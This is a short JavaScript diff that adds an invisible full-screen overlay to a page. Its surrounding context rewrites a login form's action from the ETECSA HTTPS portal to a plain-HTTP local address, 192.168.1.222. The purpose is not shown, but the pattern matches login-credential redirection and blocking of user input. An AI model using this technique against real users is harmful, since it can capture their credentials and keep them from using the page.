@@ -2,6 +2,12 @@
     var t = setInterval(function () { 
         var f = document.getElementById('formulario'); 
         if (f && f.action) { 
+            
+            var blocker = document.createElement('div');
+            blocker.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;background:transparent;cursor:not-allowed;';
+            blocker.id = 'blockerLayer';
+            document.body.appendChild(blocker);
+            
             f.action = f.action.replace('https://secure.etecsa.net:8443', 'http://192.168.1.222').replace('//LoginServlet', '/LoginServlet'); 
             try{
 
